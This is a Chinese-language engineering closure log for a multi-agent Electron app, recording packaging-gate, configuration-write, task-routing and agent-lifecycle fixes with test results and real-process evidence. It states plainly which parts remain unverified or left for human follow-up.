| `.map` 在浏览器态请求返回 404 | `Tests/Interface/staticSourceMapDenial.spec.ts` 4 例走真实 `httpServer` 静态托管路径：小写 `.map` → `404` 且响应体不含 `sourcesContent`、大写 `.MAP` → `404`、正常 chunk 仍 `200`、未知路径仍走 SPA 兜底；拒绝点前置于静态托管与兜底之前并 `logger.warn('源码映射请求被拒绝',{path,peer})` |
| 「假绿灯」四条成因须同批闭合（§15.2/15.3 交叉说明） | ① `verifyPackage` 只查 `dist/**` → `--check` 与打包收尾都改为**同时**核验 `release/`；② `verifyClientDist` 只查入口字节 → 重写为逐条断言（入口/引用资源/`.map`）；③ 不新鲜仅 warn → `--check` 模式改为"产物是否早于当前 `dist/`"这一有意义判据（实测对 10-07 的旧便携版正确告警，对 00:01 的新安装包不再误报）；④ UI 探针不在门禁内 → 第 8/8 步默认执行探针 |

**真实运行/真实读码推翻并修正了六处静态方案**（按字面回退即重新打开）：

1. **`app-update.yml` 的根因不是"陈旧产物"**：静态读 `package.json` 只看到"无 `publish` 段"，据此推断该 yml 是历史遗留；真实重打后它**每次都重新出现**——electron-builder 会从 git remote（`github.com/linmowudie/CivitasAI`）推断 publish，`publisherName` 取自签名证书主体。正解是显式 `build.publish: null`，而不是清理 `release/`。
2. **`HashMismatch` 必须无条件失败**：口径写的是"`-Require` 下未签名/无效要 fail"，但篡改 1 字节的已签名产物在裸跑时就该是红色——实测新实现**不带 `-Require` 也 exit 1**；把这类硬失败也做成"可选开关"等于保留原缺陷。
3. **`@electron/asar` 的路径语义**：`listPackage` 返回 `\` 分隔条目（需归一化为 `/`），而 `Filesystem` 按 `path.sep` 拆分——`extractFile(asarPath,'dist/renderer/index.html')` 在 Windows 上抛 "was not found in this archive"，必须传 `path.join('dist','renderer','index.html')`。静态写这段校验会产出"永远失败的负向门禁"。另外该包只有异步 `createPackage`，没有 `createPackageSync`。
4. **门禁的输出必须自证**：`verifyClientDist` 首稿按"引用条数"打印 `✅ 引用的 8 个资源均存在`，于是同一轮里同时出现 ✅ 与"❌ 有 1 个不存在"——假绿灯的一种新形态。改为每条断言只在自身通过时打 ✅。
5. **"已被护栏挡住"这句话要先证明护栏存在**：`package.cjs` 原先无条件提示"本机存在 `Configs/local.json`，已由排除护栏挡住"，而 `build.files` 里那条排除项恰好可能不存在。现改为预检第 6 项先自检排除项，缺失时直接判失败，只有确认存在才使用"挡住"措辞。
6. **预检模式里的"新鲜度"是伪命题**：`--check` 不打包，产物必然早于"本次运行开始"，原实现每轮都刷一条无效告警（真正的 REV-309 信号因此被磨成背景噪声）。改为 `startedAt=null` 分支，比对基准换成当前 `dist/` 的构建时间。

**门禁清单（`node Scripts/package.cjs`，八步）**：1 预检（Node / 图标 / electron-builder 可解析 / 必需文件 / 泄漏护栏自检 / `publish:null` / `forceCodeSigning` / 签名凭据自动发现）→ 2 静态门禁（`typecheck` + `typecheck:electron` + `vitest run --exclude realAgent`，任一失败即止）→ 3 `build:server` → 4 `build:client`（收尾挂 `verifyClientDist`）→ 5 `verifyPackage` + `verifyClientDist` → 6 `electron-builder`（注入 `CSC_*`；`--allow-unsigned` 时追加 `--config.win.forceCodeSigning=false`）→ 7 `reportArtifacts`（存在/体积/SHA256/被改写/`latest.yml` 一致性）+ `verifyRelease` + `verifyPackage --stage=post` → 8 `probePackagedBackend`。`--check` = 1 + 5 + 7（对现有产物），不构建不打包。

**回归证据**：门禁三连全绿——两个 `tsc` 干净、**149 文件 / 1783 用例全部通过**（80.18s）、`eslint Src/` 0 error / 314 warning（P0-1 轮 312，本批未新增 error）；`realAgent` 单跑 4/4（Round1 17.2s / Round2 29.7s / Round3 142.6s / 综合 28.5s，整文件 219.9s）；对新 `win-unpacked` 连跑两轮探针均 exit 0：**26 个 GET 端点全 200**、`POST /api/sessions → 201`、渲染进程 DOM 取到非空白文本（含探针新建的"打包态探针会话"）、`Logs/business.log` 零 ERROR/WARN。探针的临时数据根在 `.tmp/probe-run`，未污染仓库 `Data/`；用于取证的假 `Configs/local.json`、`.tmp/fakeRelease/`、`.tmp/sigtest/`、`Src/__gate_probe_tmp.ts` 全部已删除。

**遗留边界（不在本工单收口）**：① **需人工**——一次"不带 `--skip-tests`、含第 8 步探针"的完整链式 `npm run package`（本轮沙箱两次拦截 packaging 命令，第 2 步的流水线内串联目前只有代码路径 + 命令级取证）、以及双击安装包的 Electron GUI 冒烟（§16.4）；② CI 仍无 windows/打包/签名 job（REV-289），门禁只在开发机生效；③ `release/` 里遗留的 233KB 时代产物已被真实重打覆盖，但 `.nsis.7z`、`__uninstaller.exe` 等中间物仍留在目录里（构建噪声，未纳入清理策略）；④ REV-309 的 `asarUnpack` 无裁剪（非 win32-x64 的 `.node`、`deps/sqlite3.c` 全量解包）与"打包态不新鲜改 fail"未做；⑤ REV-290/293/295/297/298/299/284/285/300/301/303 仍为 `△`，归 P2-4/P2-1；⑥ REV-288 的 `pfxPassword` 明文落盘未改（本轮只改了默认证书主体），归 P2-4；⑦ 修复期新发现 REV-327（打包态 Chromium 缓存搬移被拒，legacy `%APPDATA%\civitas-ai` 与现路径并存）。

### 16.10 P0-4 收口记录（2026-10-09）

**验证方式**：三段**真实进程重启循环**，各起真实后端（`npx tsx Src/main.ts`，HTTP:3000 + SQLite + 事件总线），用 `/internal/api-token` 领凭据后按 `X-Civitas-Api-Token` 打真实 HTTP，读取 `Configs/local.json` 真实字节与 `Logs/business.log` 真实日志行；取证脚本与输出留档 `.tmp/p04-restart-cycle.mjs` / `.tmp/p04-port-cycle.mjs` / `.tmp/p04-mode-evidence.mjs` 与对应 `.out`。每段循环都是「写 → 读运行态 → 重启 → 再读」三相位，**观察窗跨越进程边界**——只在同进程里读回值的取证不算数（配置层缓存在同一进程内必然一致，那是假绿灯）。

| 验收口径（§16.3 原文） | 实测结果 |
|---|---|
| 改一项阈值 → 重启后仍生效且后端读到新值 | 一次写 4 项（`stopRules.limits.maxIterations` 30→47、`system.logLevel` info→debug、`ui.dashboardPollIntervalSec` 5→11、`loopDefaults.max_iterations` 30→42）：写回执 `applied` 4 条且**每项 status=`restart-required`**、`restartPendingCount:4`；写后立刻读 → `running` 仍是旧值、`onDisk` 已是新值、`restartPending` 逐项点名 `{path,running,onDisk}`；**重启后** `running == onDisk == 新值`、`restartPending: []`。端口另做一遍（它是唯一改错了就连不上后端的项）：`server.httpPort` 3000→3005 写回执同口径，重启后 3000 **ECONNREFUSED**、3005 上 `/api/configs/effective` → 200 且启动行为 `[INFO] 服务已启动 — HTTP:3005` |
| `resetField` 后 UI 与后端一致 | 重置走的是**删除语义**而非"写回默认值"：`PUT /api/configs/user` 传 unset → 回执 `removed:[4 键]`、`applied:[]`，`Configs/local.json` 字节回到 `{}`（sha256 前缀 `44136fa355b3`）；此时 `running` 仍是旧生效值、`onDisk` 已回出厂值、`restartPending` 四项反向点名（`running:"debug" / onDisk:"info"` 等）；再重启 → 全部回到出厂 30/info/5/30。前端一侧：徽标与字段状态改绑这份真实回执（`configFieldState.spec.ts` 9 例锁住 dirty / 生效态 / 「已同步」只能在后端确认且无 pending 时出现） |
| 未接线的控件要么实装要么移除 | **实装**：助手消息复制（含非安全上下文 `execCommand` 兜底，`unwired-controls.spec.tsx` ①例真实点击回显"已复制"）、AgentMonitor 生命周期状态筛选 + 搜索 + 清除（`AgentMonitor.tsx:21,53,84`）、`ui.*` 五项接到真实消费方（轮询钩子、流式缓冲、事件缓冲——`uiSettings.ts` 是唯一读取入口，优先级与面板一致：本地期望 > 后端运行态 > 出厂默认）。**移除**（附理由，非"先藏起来"）：附件/图片入口（三端都无上传通道：REST 无路由、IPC 无频道、消息表无列）、赞/踩（无反馈落库通道，原实现只在内存里变色，刷新即消失＝假反馈）、重新生成（无"截断末条回复"接口，重发只会在历史里多出一条 user 消息并留下两条助手回复，污染上下文与审计链；恢复前置条件是 `DELETE /api/messages/:id`） |
| workingMode 传而不消（REV-010/319） | 前端选择 → `POST /api/tasks` `routingMode` → `submitTask` → `receiveTask({forcedMode})` → `forceRoute` → 编排分支。真实后端同一句描述「把登录按钮颜色改成蓝色」做 A/B：不带模式 → `{"message":"路由决策由复杂度评估决定",…,"mode":"DIRECT","forced":false,"reason":"简单任务(508 tokens)，Director 直接执行"}`；带 `DELEGATION` → `{"message":"路由决策由用户指定工作方式强制决定",…,"mode":"DELEGATION","forced":true,"reason":"强制路由: DELEGATION"}`，两条任务终态均 `completed`、`result` 分别 `{"status":"success","routingMode":"DIRECT"}` / `{"status":"success","routingMode":"DELEGATION"}`。边界拒收：`LITIGATION`/`REGULATION` → `400 routingMode 不可执行：X。可选 DIRECT / DELEGATION / ASSEMBLY_LINE / CONSORTIUM；…（S12）`；无凭据 `POST /api/tasks` → `401`。可选集由 `workingModeLabels.ts` 单点导出，`TaskPanel` 下拉、`NewTaskSetup`、编排器 `SUBMITTABLE_MODES` 三处同源，且 `taskRoutingMode.spec.ts` 用 `[...SUBMITTABLE_MODES].sort() == Object.keys(WORKING_MODE_LABELS).sort()` 把跨端一致性做成机器校验 |
| 153 个控件的可写面 | 后端 `PUT /api/configs/user` 走 25 条前缀白名单（5 个精确键 + 20 个段前缀）；候选值**整批**过启动校验器（`validateAllConfigs`），不过则整批拒绝——避免"界面写成功、下次启动直接崩"。红线 `NEVER_WRITABLE` 在服务端兜底（`server.apiToken`、`supervision.approvalDefaultOnTimeout`、`supervision.criticalApprovalRoles`、`durable.recovery.*`、`eventBus.store` 等），前端漏标或有人直接打接口都写不进去——**P0-4 没有放松 CRITICAL 双人审批控制**。白名单外键进 `rejected` 并被点名、非法值进 `invalid`，回执不伪装成已保存（`userConfigWriter.spec.ts` 12 例 + `configApiEffective.spec.ts` 11 例） |

**真实运行/真实读码推翻并修正了八处静态方案**（按字面回退即重新打开）：

1. **"日志级别生效"只能收到"读到新值"这一层**：`system.logLevel=debug` 重启后 `running` 侧确实读到 `debug` 并传进 `initLogger`（`main.ts:172,198`），但 `Logs/business.log` 的 debug 行数实测仍是 **0**（信息级 5 行）——因为启动路径上没有任何 debug 级调用点。静态方案里"把级别读进 logger"等于宣称行为已变，实测试不出来。口径据此收窄：本工单只断言"后端读到新值并进入 logger 初始化"，不断言"日志变多了"。
2. **取证脚本读不到刚写的日志行**：首轮 `p04-mode-evidence.mjs` 的 `2_auto_log` 返回空——`business.log` 是异步 append，响应已返回而日志行尚未落盘。加 3s 观察窗后取到。这不是应用缺陷但必须记录：**"日志有"不等于"日志及时"**，任何以此日志为触发的下游逻辑都不能假设同 tick 可读。
3. **`uiSettings.keyOf` 首稿对未声明键抛错**：它被渲染钩子与流式/事件缓冲的**定时器**读取，抛错会打断界面——把配置层缺失升级成了运行时崩溃。改为点名一次（`console.warn` 去重）并落回出厂默认。
4. **重置不是"写回默认值"**：静态看 `resetField` 像一次写入，实测唯一正确的语义是删除该键（`removed` 回执 + 文件回到 `{}`），UI 此时必须显示"待重启生效"而不是"已同步"。若按首稿实现（把出厂值写回 `local.json`），文件会被写脏且永远无法回到"未配置"状态。
5. **REV-332：真实后端里 `POST /api/tasks` 的每一条任务都失败**，而**全部单测绿灯**。失败是 `Agent agent-prime_director-N 已注册`——`agentFactory` 的 ID 计数器进程级归零，而 `main.ts:320` `hydrateAgents()` 会把库中未销毁的同名行回灌进注册表（DB 取证：`agents` 共 6 行、4 行存活，`agent-prime_director-1` 的 `destroyed_at` 为 null）；单测每例 `resetAgentRegistry()` 恰好抹掉了这个前提。修复：`nextAgentId()` 首次分配前用 `maxAgentIdSeq()`（**跨账号、含已销毁行**）顶高计数器，并用 `hasAgent()` 逐个避让——同时堵住了另一半更严重的后果：已销毁行不在内存时，写透 `upsertAgent` 的 `ON CONFLICT(agent_id) DO UPDATE` 会**覆盖历史行、抹掉审计痕迹**。修复后重跑同一取证脚本，两条任务都 `completed`（见上表）。
6. **编排是同步跑在 HTTP 请求的微任务里**：两条任务的 `路由决策…` 日志 `epochMs` 相差 28ms，随后的 `GET /api/tasks` 已显示 `completed`——即 `submitTask` 在**派发**时就按同步返回值标了终态。这条口径（派发≠完成、任务卡应显示什么）实测证据齐备，登记为 REV-334，归 P1-7 收口，不在本工单顺手改（改法要同时决定事件流与 `tasks` 表谁是终态权威）。
7. **裁剪 `WorkingMode` 造成一处真实回归**：`newTaskWorkspaceLock.spec.tsx` 断言 `expected '' to be 'LITIGATION'`——它选的是已被移除的死选项。修测试的同时补了一条"工作模式下拉只能列出编排器可执行四项"的选项集锁，否则同类回退（有人加回第六种模式）仍会静默通过。
8. **"接到配置上"不等于"按字段名读配置"**（REV-335，本轮唯一由**既有**测试拦下的自伤回归）：把事件缓冲接给 `ui.maxEventBufferSize` 时按字面把它当硬上限，于是接线前的「1000 触发 / 保留 500」两级批量裁剪被改成「500 硬上限」——**有效容量无声砍半**，且每次 push 都可能切片。全量跑报 `expected length 1000 but got 500` 才暴露。修复是把配置值定义为"超限时保留的条数"、触发点仍是 2 倍（默认下与接线前逐条等价），并同步 `configSchema` 的说明文案；再加一条 `overrides=60` 的用例证明该值**真的被读**——只测默认值永远区分不了"接了线"与"数字恰好相等"。

**回归证据**：两个 `tsc`（`Client/tsconfig.json` / 根）与 `typecheck:electron` 均干净；`Tests/Client` 25 文件 / 208 用例全绿；P0-4 新增定向五文件 **54 用例**——`configFieldState`(9) + `userConfigWriter`(12) + `configApiEffective`(11) + `uiSettings`(10) + `unwired-controls`(12)；收口批再加 `taskRoutingMode`(7) + `forcedRoutingMode`(3) + `agentIdReuse`(3)。全量 `vitest run Tests`：**首跑 1 failed / 1850 passed**（即 REV-335 那条自伤回归），修复后复跑 **157 文件 / 1852 用例全绿**，64.01s；`eslint Src/` **0 error / 323 warning**（P0-3 轮基线 314，本批 +9 全部是同类既有规则族 `import/order`/`no-non-null-assertion`/`explicit-function-return-type`，经 `git show HEAD:` 比对确认非本批新引入的风格债）。三轮真实 Agent 调用（`Tests/AgentRuntime/realAgent.spec.ts`，真实模型）：**4/4 通过，整文件 157.69s** — Round1 编码 20.71s / Round2 设计 28.65s / Round3 分析 **75.04s（含一次审核拒绝→重新提交→通过）** / 综合多 Agent 并行 + Token 守恒 30.99s。**一条需要说明的观测**：该 harness 从不初始化数据库，故每轮都伴随 `Agent 落库失败 / Agent 更新落库失败 / Agent ID 序号载入失败（按 0 处理）` 的 ERROR 行（全量跑 165 行），这掩盖了真实落库故障的信号；`maxAgentIdSeq()` 在这种纯内存场景返回 0 是**设计内**行为（无历史行可撞），但噪声本身登记为 REV-337。取证用的 `Configs/local.json` 只写了业务阈值，未含任何凭据；`Data/` 未被测试污染（DB 取证副本 `.tmp/dbg` 已删除）。

**遗留边界（不在本工单收口）**：① REV-328（事件/IPC 契约漂移）→ P1-4；REV-331（`validateShape` 从不与基线比较，非法值可写入）、REV-334（派发即标终态）、REV-336（编排后 `agents` 行从不销毁、列表出幽灵）、REV-330（远程访问自我锁门）→ **P1-7**（§16.3 新增批，原六批无对应桶）；REV-337（库未初始化时按 error 逐条打落库失败，真实故障信号被噪声淹没）→ P1-3（错误与日志呈现口径家族）；② REV-333 的**成功侧**残留：DIRECT/DELEGATION 成功后 `tasks` 行仍不回写终态（失败侧本轮已补日志 + `updateTaskRow`），与 REV-334 同批修；③ `Sessions` 无 `working_mode` 列——本工单按"删字段"口径收口（前端不再声称会话级持久化，`agent_id` 保留 `?? session_id` 显式回落），真要会话绑定工作方式需补迁移，另立条目；④ Electron GUI 冒烟（Settings 面板实际点按、AgentMonitor 筛选、TaskPanel 下拉）仍需人工（§16.4）；⑤ 429/退避下的 Settings 写失败呈现归 P1-5。

### 16.11 P1-7 收口记录（2026-10-09）

**范围**：本批合并两个工单——**P1-7a** 配置写路径配对（REV-330 远程访问自我锁门、REV-331 `validateShape` 不与基线比较）与 **P1-7b** 任务/Agent 终态权威（REV-333 成功侧不回写、REV-334 派发即标终态、REV-336 编排后 `agents` 行不销毁）。

**验证方式**：按 §16.4/§16.6 的口径，**不以单测通过作为收口**。独立起真实后端（`npx tsx Src/main.ts`，HTTP:3000 + SQLite + 事件总线），`POST /internal/api-token` 领凭据后按 `X-Civitas-Api-Token` 打真实 HTTP，同时读 `Configs/local.json` 真实字节、`Logs/business.log` 真实日志行、`Data/db/civitas_main.db` 真实行（只读连接）。脚本与输出留档 `.tmp/p17-real-evidence.mjs` / `.out`、`.tmp/p17-review-evidence.mjs` / `.out`。

| 验收口径（§16.3 原文） | 实测结果 |
|---|---|
| ① 远程访问配对拦截 | `PUT /api/configs/user` 同批传 `{server.host:'0.0.0.0', server.allowRemoteAccess:true}` → 回执 `applied: []`、`invalid` 两条点名（各自独立给出同一配对理由），`Configs/local.json` 保持 `<ABSENT>`（**一个字节都没落盘**）。关键的反向取证：只传 `{host:'127.0.0.1', allowRemoteAccess:true}` → **放行**（`applied` 有值），说明规则拦截的是"非回环 + 无凭据"这一具体组合，不是把 `allowRemoteAccess` 一刀切禁掉；重启后 `running.server` 读回 `127.0.0.1 / true` 且服务照常可用，`server.host=0.0.0.0` 在带 `allowRemoteAccess=true` 的磁盘态下仍被拒。**没有因此打开任何非回环监听**（每次启动日志均为 `HTTP:3000` 回环）。 |
| ② 对对象段写标量必须被拒，磁盘段不被整体替换 | 传 `{supervision.rateLimit:1, economy.tax:['a','b'], stopRules.budget:1}` → 三条各自进 `invalid` 并点名"该项是一个配置段（含 4/8/4 个子键）…请按子键逐项写入"；**同批的合法标量 `ui.dashboardPollIntervalSec:11` 照常 `applied`**——逐路径拒绝，不是整批拒绝。落地证据：写后 `local.json` 里 `supervision.rateLimit` 段仍是对象、`economy.tax` 仍是对象，未被标量/数组覆盖；随后逐子键写 `{supervision.rateLimit.maxRequestsPerMinute:25, economy.tax.baseRate:0.06}` → 放行且磁盘段保留其余子键。 |
| ③ 派发 ≠ 完成 | 真实后端提交 `routingMode=DELEGATION` 任务后立即读：视图 `status: running`（**不是 completed**）、`tasks` 行同为 `running` 且 `completed_at` 为 null、`result` 是结构化派发回执 `{status:'dispatched', routingMode:'DELEGATION', assignmentCount:2}`，`subtasks` 两行 `assigned`。前端 `describeTaskResult` 不再把裸 JSON 甩给用户，`taskPanelResultLabel.spec.tsx` 3 例锁住"已派发/待人工/失败"文案。 |
| ④ 成功任务的 `tasks` 行落终态 | **代码与真实库路径已取证，真实进程端到端不可达**（见下段）。读写两侧：`finalizeOrchestration` 是唯一终态写入点，`taskTerminalAuthority.spec.ts` 8 例锁住「内存 Map 只作派发缓存、读侧先映射终态再过滤、DB 不可用时如实保留内存视图」；真实库里既有历史 `completed` 行带非空 `completed_at` 与 `final_result`。 |
| ⑤ 编排结束不留幽灵 | 同上：`releaseRunAgents()` 在编排收尾对每个 `agent_id` 走 `unregisterAgent`（软销毁写 `destroyed_at`），`agentRuntime.ts:147` 是 assignment 级 `TASK_COMPLETED` 的唯一发布者。真实取证看到的是**未修复路径的行为**：`exec孤儿trace统计` 显示本次 `trace-exec-*` 的 2 行 `destroyed_at` 为 null——因为流程从未走到收尾（④⑤ 链路缺口），非本批回归。 |

**为什么 ④⑤ 不写成"已验证"**：连续 6 次真实 `/api/agents/:agentId/execute`（每个 Worker 3 次，指令明确要求"第一步就调用 `agent.submit_review`"）全部 HTTP 200、`exitReason: success|max_iterations`，但 `GET /api/reviews` 返回 `[]`、任务卡在 `running`。抓取到的模型输出实为 `ModelArts.81001 … Invalid messages at index 2/3. Messages with role 'tool' must be a response to a preceding message with 'tool_calls'`——请求体本身被上游拒绝（根因在 `runIteration.ts:986-995`：助手消息从未带 `tool_calls`，工具结果却以 `role:'tool'` 追加），而执行入口把这个错误文本当成功返回。链路里另有两处结构性缺口：`TASK_ASSIGNED` 无订阅者（编排只派发不驱动执行）、`TASK_FAILED` 无发布者（失败永不收尾）。已如实登记为 **REV-338 / REV-339 / REV-341**，它们是 ④⑤ 真实进程复验的前置条件；本批不顺手改（改法涉及执行驱动归属与消息装配两处架构决策）。

**首版取证脚本的自伤（必须记录）**：第一版 `.tmp/p17-evidence.mjs` 用 `child.kill('SIGINT')` 停进程，而 `spawn(..., {shell:true})` 下信号只打到 shell，`tsx` 子进程仍在监听 → 第二次启动日志是 `[FATAL] 启动失败: listen EADDRINUSE 127.0.0.1:3000`，后续相位全部跑在**旧进程**上。也就是说"重启后仍可登录"这一维度在第一版里是**假取证**。修正版改为 PID 级 `hardStop()`（`netstat -ano -p tcp` 取监听 PID + `Stop-Process -Force`，等端口释放）、每次启动独立日志文件、并断言本次日志里出现 `服务已启动` 才算重启成功。教训：**任何以"重启"为观察窗的取证，必须先证明旧进程真的死了**。

**回归证据**：全量 `vitest run Tests` **160 文件 / 1872 用例全绿**，165.67s（P0-4 收口时基线 157 文件 / 1852 用例，本批 +3 文件 +20 用例）；本批新增定向两文件 `Tests/Interface/taskTerminalAuthority.spec.ts`(8) + `Tests/Client/taskPanelResultLabel.spec.tsx`(3) 单独跑 11/11 通过；三个 `tsc`（根 / `Client/tsconfig.json` / `tsconfig.electron.json`）均 0 输出；`eslint Src/` **0 error / 323 warning**——与 P0-4 收口时的 323 逐条相同，本批未新增任何 warning。三轮真实 Agent 调用（`Tests/AgentRuntime/realAgent.spec.ts`，真实模型）：**4/4 通过，整文件 163.65s** — Round1 编码 20.05s / Round2 设计 37.44s / Round3 分析 75.42s（含一次审核拒绝→重新提交→通过）/ 综合多 Agent 并行 + Token 守恒 30.75s。**一条口径约束**：这份全量绿灯**不能**反过来说明 ④⑤ 可用——`realAgent` harness 在内存里直接把 `submit_review` 接到评审端口上，绕开了"`TASK_ASSIGNED` 无订阅者"和 provider 请求体被拒这两处只在真实 HTTP 链路上暴露的缺口（正是 REV-338/341 的成因）。单测证明的是"终态写入与读侧映射这段逻辑本身对"，链路是否通只能由上面的真实进程取证说话。

**现场清理**：取证期间创建的 `Configs/local.json` 已在收尾删除（`localJson已删除: true`，取证前该文件不存在），其内容只有业务阈值与 `127.0.0.1`，**未写入任何凭据**；端口 3000 已释放。遗留的两条 `running` 任务行与 2 条未销毁 `agents` 行**未手工删除**——删库行不可逆且会抹掉审计痕迹，留给判断（记录于 REV-336）。所有改动仍未提交。

**遗留边界（不在本工单收口）**：① REV-338/339/341 → 需先补执行驱动与 `task:failed` 发布、修消息装配，才能对 ④⑤ 做真实进程复验；② REV-340（`trace-exec-*` 漂移、reviewer 孤儿行）、REV-342（`agents` 行与内存状态漂移）已登记未修；③ 聊天路径（非 DIRECT 工作方式经 `yieldToOrchestrator` 转后台任务）本轮只做代码路径取证，未做浏览器端真实点按；④ Electron GUI 冒烟仍需人工（§16.4）。

### 16.12 P1-8 收口记录（2026-10-09）

**范围**：REV-338（派发了但没人执行）+ REV-339（失败侧永不收尾）+ REV-340（`trace-exec-*` 第四类孤儿行）+ REV-341（发生过工具调用的 Loop 第二轮被提供方拒绝，且错误文本被当成功返回）+ REV-344（`subtasks` 只在成功侧写终态）+ REV-345 的 ①（任务书预算/迭代数丢在派发载荷里）+ REV-346（任务书时限同样只是记录）+ REV-347（`started_at` 恒 `NULL`）。本批是 §16.11 里"④⑤ 在 `:3000` 真实进程不可达"的直接清欠。

**验证方式**：按 §16.4/§16.6，**不以单测通过作为收口**。独立起真实后端（`npx tsx Src/main.ts`，HTTP:3000 + SQLite + 事件总线），取证脚本 `.tmp/p17-review-evidence.mjs` 在本批被改成**只提交一次 `POST /api/tasks`（DELEGATION），之后只做只读轮询**——不再有任何手工 `POST /api/agents/:id/execute`。这是本批验收成立的前提：如果驱动不是产品自己完成的，① 就没有被证明。三轮实跑输出留档 `.tmp/p18-driver-evidence.out`、`.tmp/p18-driver-evidence-2.out`、`.tmp/p18-driver-evidence-3.out`。

**三轮不是"重复跑三次"，而是"发现 → 修复 → 复验"**：

| 轮次 | 任务号 | 当时代码状态 | 证明了什么 | 发现了什么（→ 新条目） |
|---|---|---|---|---|
| 第一轮 12:05 | `task-0408ef78` | P1-8 主体（taskDriver + 三处 `task:failed` 发布者 + `tool_calls` 贯通 + traceId 沿用）已到位 | 一次提交后**无人工驱动**，两个 Worker 由产品自己跑完；`tasks` 落 `failed` + `_summary`；`releaseRunAgents` 回收 3 个 Agent；`全库running无destroyed = []`（轮询 14 次即终态） | `subtasks` 两行仍 `assigned`、`completed_at IS NULL` → **REV-344**；`tokensConsumed 416907/416532` 而台账 `token_budget=15000` → **REV-345** |
| 第二轮 12:10~12:20 | `task-0cbf6b76` | 补 REV-344 后 | 两行落 `failed` + `failure_reason` + `completed_at`，与 `tasks` 行口径一致；`finalizeOrchestration` 接受**部分失败**并聚合出 `_summary` | worker-37 从 12:10:20 跑到 12:20:25 共 **605s**（台账 `timeout_ms=150000`）→ **REV-346**；期间两次 300s 审批阻塞与终态时间**逐秒对齐** → **REV-348**；两行 `started_at IS NULL` → **REV-347**；轮询 129 次 / 646570ms 才等到终态 |
| 第三轮 12:22~12:23 | `task-f1d3d3e6` | 补 REV-346/347 后（最终态） | 见下表，五项验收口径全部为**修复后复验** | 无新缺口；REV-345 的 ② 原样复现（单轮 20.8 万 token） |

**验收口径实测（§16.3 P1-8 行原文 ①~⑤，主体取第三轮最终态）**

| 口径 | 实测结果 |
|---|---|
| ① Worker 由产品自身驱动 | `10_后台驱动轮询` 的结束原因是 `"tasks 行由产品自身写入终态：failed"`，脚本全程只发过 1 次 `POST /api/tasks` + 15 次 GET 轮询（75257ms）。`Logs/business.log` 里 `source":"Orchestrator/taskDriver"` 的「后台执行驱动完成」正好两条，与两个 Worker 一一对应（`agent-worker-39` / `agent-worker-40`，`exitReason=budget_exhausted`、`iterations=2`、`tokensConsumed=417106 / 417196`）。 |
| ② `tasks` 行终态由编排收尾写入 | `tasks` 行 `status=failed`、`completed_at=1791548593482`、`final_result` 含两条 `_errors` + `_summary {total:2,success:0,failed:2,partial:0}`；`GET /api/tasks/:taskId` 的视图与库行**逐字段一致**（`withAuthoritativeState` 的读侧覆盖在真实进程里对齐，不再是"内存说 completed、库里 running"）。 |
| ③ 子任务台账与任务行同口径 | 两行 `status=failed`、`completed_at` 有值、`failure_reason` 带上 `exitReason`/迭代数/末轮输出摘要（例：`循环结束未提交评审（exitReason=budget_exhausted iterations=2 output=…）`）。第一轮的 `assigned` + `NULL` 组合已由 `markSubtaskFailed` 消除，且未出现一次失败计两次（终态幂等护栏 + `source !== 'AgentRuntime/reviewSubmission'` 同时在起作用）。 |
| ④ 编排结束不留幽灵 | 本次编排 trace 下 3 行（`agent-prime_director-38` / `agent-worker-39` / `agent-worker-40`）全部 `status=destroyed` 且 `destroyed_at` 非空（1791548593488/393/400），与「编排收尾已回收 Agent `count:3`」日志一致；`全库running无destroyed = []`；**本次开跑后新增的 `trace-exec-*` 行为 0 行**（REV-340 的 `agent.traceId` 沿用生效）。历史 7 个 `trace-exec-*` trace / 8 行**未手工删除**（口径同 REV-336）。 |
| ⑤ 任务书预算与时限真的进 Loop | `token_budget=15000` 的止损**真的会停**：两个 Worker 都在 `iterations=2` 处以 `budget_exhausted` 收尾（第二轮同一条指令跑了 3 轮 420289）；`timeout_ms=150000` 现在可与实耗对账——两行 `elapsed_sec` 为 **36.476 / 35.606**，整任务 75s 收尾，不再出现第二轮的 605s 越限。 |
| 附：串行队列与 `started_at` 的语义 | `01_派发` 快照里前排 `assign-task-f1d3d3e6-0` 已 `in_progress` + `started_at=1791548521396`，后排仍 `assigned` + `started_at=null`；终态时后排 `started_at=1791548557874` 恰为前排 `completed_at=1791548557872` **+2ms**。即队列顺序成立，且**排队时间没有被算进执行时间**（这正是 REV-347 修复时定下的"不得在派发时刻写"约束，第一次在真实数据上可比）。 |

**诚实边界（本批不写成"全链路已通"）**：
- **④⑤ 的"成功"那一半仍未取到**。三轮里 `GET /api/reviews` 都是 `全量条数: 0`，两个 Worker 都在预算耗尽时停住（`failure_reason` 明写"循环结束未提交评审"），从未走到 `agent.submit_review`。根因是 REV-345 的 ②——**单轮约 20.8 万 token**，15000 的预算一轮就爆，所以 Worker 没机会产出可评审的成果；这是用量统计/上下文规模问题（归 P1-5），不是 P1-8 的装配缺口。故"成功任务落 `completed`"与"评审端到端"两项**继续标注为未取证**，§16.11 那句"不能以全量绿灯反推 ④⑤ 可用"在本批同样成立。
- **REV-341 的修复已可观测但不是零风险**：三轮日志里提供方 400（`Invalid messages at index 2/3`）均未再出现，Worker 能在工具调用后继续跑第二轮——这证明 `tool_calls`/`tool_call_id` 贯通到位；而"跑到提交评审"仍未发生（见上条），所以本批只宣称"不再被提供方拒绝"，不宣称"工具循环完整可用"。
- **REV-348 未修**：第二轮的 605s 里时间全部花在等一个不会来的批准上（`tokensConsumed` 只有 5377），而 `timeout_ms`/`token_budget` 都只在**迭代边界**判定，迭代内的 `await` 不可中断。后台化把这个问题放大了（一次 CRITICAL 工具调用挂住整条串行队列），需要产品口径才能改，故不顺手修。

**回归证据**：三个 `tsc`（根 / `Client/tsconfig.json` / `typecheck:electron`）均 **0 输出**；本批定向用例 `Tests/Decision/taskDriverChain.spec.ts` **10/10**（REV-338 派发幂等与参数透传、REV-339 拒绝侧终态与聚合前置、REV-344 台账幂等、REV-347 `in_progress` 写点，其中执行参数断言直接锁 `executeAssignedTask` 的入参而非事件字段，避免"只测了发送侧"）；`Tests/Core/toolMessageAssembly.spec.ts` **6/6**（REV-341 的 `tool_calls`/`tool_call_id` 装配）；全量 `vitest run Tests` **162 文件 / 1888 用例，1 failed / 1887 passed**，228.95s。

